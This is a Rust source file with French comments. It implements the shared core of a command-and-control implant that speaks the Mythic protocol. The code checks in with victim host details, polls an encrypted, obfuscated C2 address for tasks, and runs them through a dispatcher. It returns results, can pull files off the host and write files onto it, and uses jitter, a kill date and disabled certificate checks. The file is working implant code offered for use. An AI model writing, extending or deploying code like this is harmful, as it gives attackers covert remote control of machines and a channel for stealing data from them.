// link-common — Mythic protocol implementation
//
// Ce module remplace le protocole 3-stage custom de Linky par le protocole
// standard Mythic : checkin → get_tasking → post_response.
//
// Format message Mythic : UUID(36) + base64(AES-256-GCM(JSON))
// Clé AES : derive_key(IMPLANT_SECRET, "mythic-salt") — identique à Linky.
//
// Sprint 2 : compléter l'implémentation (staging, chunked transfers, delegates).

use obfstr::obfstr as s;
use std::sync::atomic::{AtomicI64, AtomicU32, AtomicU64, Ordering};

pub mod dispatch;

// ── Wire types Mythic ──────────────────────────────────────────────────────────

/// Message de checkin envoyé à Mythic lors du premier contact.
#[derive(serde::Serialize)]
pub struct CheckinMessage<'a> {
    pub action: &'a str,   // "checkin"
    pub uuid: &'a str,     // PAYLOAD_UUID embarqué dans le binaire
    pub user: String,
    pub host: String,
    pub pid: u32,
    pub ip: String,
    pub os: &'a str,
    pub arch: &'a str,
    pub domain: &'a str,
    pub integrity_level: u8, // 2 = medium, 3 = high, 4 = system
    pub extra_info: &'a str,
    pub sleep_info: &'a str,
}

/// Réponse de checkin de Mythic — contient le callback_id définitif.
#[derive(serde::Deserialize, Default)]
pub struct CheckinResponse {
    pub action: String,
    pub id: String,     // callback UUID assigné par Mythic (remplace PAYLOAD_UUID)
    pub status: String, // "success" ou "error"
}

/// Requête de polling de tâches.
#[derive(serde::Serialize)]
pub struct GetTaskingMessage<'a> {
    pub action: &'a str,     // "get_tasking"
    pub tasking_size: i32,   // -1 = toutes les tâches disponibles
}

/// Une tâche reçue de Mythic.
#[derive(serde::Deserialize, Default, Clone)]
pub struct Task {
    pub id: String,
    pub command: String,
    pub parameters: String,
}

/// Réponse de get_tasking contenant les tâches en attente.
#[derive(serde::Deserialize, Default)]
pub struct GetTaskingResponse {
    pub action: String,
    pub tasks: Vec<Task>,
}

/// Résultat d'une tâche exécutée, à envoyer à Mythic.
#[derive(serde::Serialize)]
pub struct TaskResponse {
    pub task_id: String,
    pub completed: bool,
    pub user_output: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub status: Option<String>, // "error" si erreur
}

/// Message post_response — envoie les résultats à Mythic.
#[derive(serde::Serialize)]
pub struct PostResponseMessage<'a> {
    pub action: &'a str,              // "post_response"
    pub responses: Vec<TaskResponse>,
}

// ── HTTP client ────────────────────────────────────────────────────────────────

pub fn build_client() -> reqwest::blocking::Client {
    reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .expect("reqwest client init failed")
}

// ── Encryption (identique à Linky, compatible avec Mythic MythicEncryptsData=true) ──

/// Dériver une clé AES-256 depuis le secret implant (SHA-256).
pub fn derive_key(secret: &[u8], salt: &str) -> [u8; 32] {
    use sha2::{Digest, Sha256};
    let mut h = Sha256::new();
    h.update(secret);
    h.update(salt.as_bytes());
    let result = h.finalize();
    let mut key = [0u8; 32];
    key.copy_from_slice(&result[..32]);
    key
}

/// Chiffrer un payload JSON → hex(nonce || ciphertext).
pub fn encrypt(data: &str, key: &[u8; 32]) -> String {
    use aes_gcm::{aead::{Aead, KeyInit}, Aes256Gcm, Nonce};
    let nonce_bytes = rand::random::<[u8; 12]>();
    let nonce = Nonce::from_slice(&nonce_bytes);
    let cipher = Aes256Gcm::new_from_slice(key).expect("cipher init");
    let ct = cipher.encrypt(nonce, data.as_bytes()).expect("encrypt");
    let mut result = Vec::with_capacity(12 + ct.len());
    result.extend_from_slice(&nonce_bytes);
    result.extend_from_slice(&ct);
    hex::encode(result)
}

/// Déchiffrer hex(nonce || ciphertext) → JSON.
pub fn decrypt(enc_hex: &str, key: &[u8; 32]) -> Option<String> {
    use aes_gcm::{aead::{Aead, KeyInit}, Aes256Gcm, Nonce};
    let data = hex::decode(enc_hex).ok()?;
    if data.len() < 12 { return None; }
    let nonce = Nonce::from_slice(&data[..12]);
    let cipher = Aes256Gcm::new_from_slice(key).ok()?;
    cipher.decrypt(nonce, &data[12..]).ok()
        .and_then(|b| String::from_utf8(b).ok())
}

/// Construire un message Mythic : UUID + base64(AES(JSON))
pub fn build_mythic_message(uuid: &str, payload_json: &str, key: &[u8; 32]) -> String {
    let encrypted = encrypt(payload_json, key);
    let b64 = base64::engine::general_purpose::STANDARD.encode(hex::decode(&encrypted).unwrap_or_default());
    format!("{}{}", uuid, b64)
}

/// Parser un message Mythic reçu : extraire et déchiffrer le JSON.
pub fn parse_mythic_message(raw: &str, key: &[u8; 32]) -> Option<String> {
    if raw.len() < 36 { return None; }
    let b64_part = &raw[36..];
    let decoded = base64::engine::general_purpose::STANDARD.decode(b64_part).ok()?;
    let hex_str = hex::encode(decoded);
    decrypt(&hex_str, key)
}

// ── État partagé (sleep / jitter / kill date) ──────────────────────────────────

static SLEEP_SECONDS: AtomicU64 = AtomicU64::new(5);
static JITTER_PERCENT: AtomicU32 = AtomicU32::new(0);
static KILL_DATE: AtomicI64 = AtomicI64::new(i64::MIN);

pub fn get_sleep_seconds() -> u64 { SLEEP_SECONDS.load(Ordering::Relaxed) }
pub fn set_sleep_seconds(s: u64)  { SLEEP_SECONDS.store(s, Ordering::Relaxed); }
pub fn get_jitter_percent() -> u32 { JITTER_PERCENT.load(Ordering::Relaxed) }
pub fn set_jitter_percent(p: u32)  { JITTER_PERCENT.store(p.min(100), Ordering::Relaxed); }
pub fn get_kill_date() -> Option<i64> {
    let v = KILL_DATE.load(Ordering::Relaxed);
    if v == i64::MIN { None } else { Some(v) }
}
pub fn set_kill_date(ts: Option<i64>) {
    KILL_DATE.store(ts.unwrap_or(i64::MIN), Ordering::Relaxed);
}
pub fn should_exit() -> bool {
    if let Some(kd) = get_kill_date() {
        if let Ok(now) = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
            return now.as_secs() as i64 > kd;
        }
    }
    false
}

// ── Timing ────────────────────────────────────────────────────────────────────

pub fn sleep(secs: u64) {
    std::thread::sleep(std::time::Duration::from_secs(secs));
}

pub fn sleep_with_jitter(base: u64, jitter_pct: u32) {
    if jitter_pct == 0 { return sleep(base); }
    let range = (base as f64 * jitter_pct as f64 / 100.0) as i64;
    let jitter = (rand::random::<u64>() as i64 % (2 * range + 1)) - range;
    let t = if jitter < 0 {
        base.saturating_sub(jitter.unsigned_abs())
    } else {
        base.saturating_add(jitter as u64)
    };
    sleep(t.max(1));
}

// ── Helpers partagés ──────────────────────────────────────────────────────────

pub fn split_first(s: &str) -> (&str, &str) {
    s.find(' ').map(|i| (&s[..i], s[i+1..].trim_start())).unwrap_or((s, ""))
}

pub fn list_dir(path: &str) -> String {
    match std::fs::read_dir(path) {
        Ok(entries) => entries.flatten().map(|e| {
            let name = e.file_name().to_string_lossy().into_owned();
            if e.file_type().map(|t| t.is_dir()).unwrap_or(false) { format!("{}/", name) } else { name }
        }).collect::<Vec<_>>().join("\n"),
        Err(e) => format!("[-] {}", e),
    }
}

pub fn download_file(path: &str) -> String {
    use base64::{engine::general_purpose::STANDARD, Engine as _};
    if path.is_empty() { return "[-] Usage: download <path>".into(); }
    match std::fs::read(path) {
        Ok(buf) => format!("FILE:{}:{}", path, STANDARD.encode(&buf)),
        Err(e) => format!("[-] {}", e),
    }
}

pub fn upload_file(args: &str) -> String {
    use base64::{engine::general_purpose::STANDARD, Engine as _};
    let (content, path) = match args.find(' ') {
        Some(i) => (&args[..i], args[i+1..].trim_start()),
        None => return "[-] Invalid upload format".into(),
    };
    let decoded = match STANDARD.decode(content) {
        Ok(d) => d, Err(e) => return format!("[-] base64 decode: {}", e),
    };
    match std::fs::write(path, &decoded) {
        Ok(()) => format!("[+] Uploaded to {}", path),
        Err(e) => format!("[-] {}", e),
    }
}

pub fn handle_sleep_command(args: &str) -> String {
    if args.is_empty() {
        return format!("sleep: {}s, jitter: {}%", get_sleep_seconds(), get_jitter_percent());
    }
    let parts: Vec<&str> = args.split_whitespace().collect();
    if let Ok(s) = parts[0].parse::<u64>() {
        set_sleep_seconds(s);
        if parts.len() > 1 {
            if let Ok(j) = parts[1].parse::<u32>() { set_jitter_percent(j); }
        }
        return format!("[+] sleep: {}s, jitter: {}%", get_sleep_seconds(), get_jitter_percent());
    }
    "[-] Usage: sleep <seconds> [jitter%]".into()
}

pub fn handle_killdate_command(args: &str) -> String {
    if args.is_empty() {
        return match get_kill_date() {
            Some(ts) => format!("killdate: {}", ts),
            None => "no killdate set".into(),
        };
    }
    if args.to_lowercase() == "clear" { set_kill_date(None); return "[+] killdate cleared".into(); }
    if let Ok(ts) = args.parse::<i64>() { set_kill_date(Some(ts)); return format!("[+] killdate: {}", ts); }
    "[-] Usage: killdate <timestamp|YYYY-MM-DD|clear>".into()
}

// ── Boucle C2 principale — protocole Mythic ────────────────────────────────────

/// Structure d'information d'enregistrement fournie par le code plateforme.
pub struct RegisterInfo {
    pub user: String,
    pub host: String,
    pub ip: String,
    pub os: &'static str,
    pub arch: &'static str,
    pub pid: u32,
    pub integrity_level: u8,
}

/// Boucle C2 Mythic principale, partagée entre tous les implants.
///
/// `callback`       : adresse C2 (chiffrée dans le binaire, déchiffrée au runtime)
/// `implant_secret` : clé de déchiffrement (IMPLANT_SECRET depuis env!())
/// `payload_uuid`   : UUID du payload généré par Mythic (PAYLOAD_UUID depuis env!())
/// `reg`            : informations système collectées par le code plateforme
/// `dispatch`       : fonction de dispatch des commandes (plateforme-spécifique)
pub fn run_c2_loop<F>(
    callback: &str,
    implant_secret: &str,
    payload_uuid: &str,
    reg: RegisterInfo,
    dispatch: F,
) where
    F: Fn(&str, &str) -> String,  // (command_name, parameters) → output
{
    let encryption_key = derive_key(implant_secret.as_bytes(), s!("mythic-salt"));
    let decrypted_callback = decrypt(callback, &encryption_key)
        .unwrap_or_else(|| callback.to_string());

    let client = build_client();
    let base = format!("https://{}", decrypted_callback);
    // TODO Sprint 2 : lire l'URI depuis les paramètres du profil C2 (ex: /data)
    let uri = s!("/");

    // ── Checkin ──────────────────────────────────────────────────────────────
    let checkin = CheckinMessage {
        action: s!("checkin"),
        uuid: payload_uuid,
        user: reg.user.clone(),
        host: reg.host.clone(),
        pid: reg.pid,
        ip: reg.ip,
        os: reg.os,
        arch: reg.arch,
        domain: s!(""),
        integrity_level: reg.integrity_level,
        extra_info: s!(""),
        sleep_info: s!(""),
    };

    let checkin_json = serde_json::to_string(&checkin).unwrap_or_default();
    let checkin_msg = build_mythic_message(payload_uuid, &checkin_json, &encryption_key);

    let mut callback_id = String::new();
    let mut retry_delay: u64 = 5;

    loop {
        if should_exit() { return; }
        match client.post(format!("{}{}", base, uri))
            .body(checkin_msg.clone())
            .header("Content-Type", "application/octet-stream")
            .send()
        {
            Ok(resp) => {
                if let Ok(raw) = resp.text() {
                    if let Some(json) = parse_mythic_message(&raw, &encryption_key) {
                        if let Ok(cr) = serde_json::from_str::<CheckinResponse>(&json) {
                            if cr.status == s!("success") {
                                callback_id = cr.id;
                                break;
                            }
                        }
                    }
                }
            }
            Err(_) => {}
        }
        sleep(retry_delay);
        retry_delay = (retry_delay * 2).min(60);
    }

    // ── Boucle de polling ──────────────────────────────────────────────────────
    loop {
        if should_exit() { break; }

        let get_tasking = GetTaskingMessage { action: s!("get_tasking"), tasking_size: -1 };
        let get_json = serde_json::to_string(&get_tasking).unwrap_or_default();
        let get_msg = build_mythic_message(&callback_id, &get_json, &encryption_key);

        let tasks: Vec<Task> = match client
            .post(format!("{}{}", base, uri))
            .body(get_msg)
            .header("Content-Type", "application/octet-stream")
            .send()
            .and_then(|r| r.text())
        {
            Ok(raw) => parse_mythic_message(&raw, &encryption_key)
                .and_then(|j| serde_json::from_str::<GetTaskingResponse>(&j).ok())
                .map(|r| r.tasks)
                .unwrap_or_default(),
            Err(_) => { sleep_with_jitter(get_sleep_seconds(), get_jitter_percent()); continue; }
        };

        if tasks.is_empty() {
            sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
            continue;
        }

        // Exécuter chaque tâche et collecter les réponses
        let mut responses = Vec::new();
        for task in &tasks {
            if task.command == s!("exit") { return; }
            let output = dispatch(&task.command, &task.parameters);
            responses.push(TaskResponse {
                task_id: task.id.clone(),
                completed: true,
                user_output: output,
                status: None,
            });
        }

        // Envoyer les résultats à Mythic
        let post_resp = PostResponseMessage { action: s!("post_response"), responses };
        let post_json = serde_json::to_string(&post_resp).unwrap_or_default();
        let post_msg = build_mythic_message(&callback_id, &post_json, &encryption_key);

        let _ = client
            .post(format!("{}{}", base, uri))
            .body(post_msg)
            .header("Content-Type", "application/octet-stream")
            .send();

        sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
    }
}

pub use serde_json;
pub use base64;
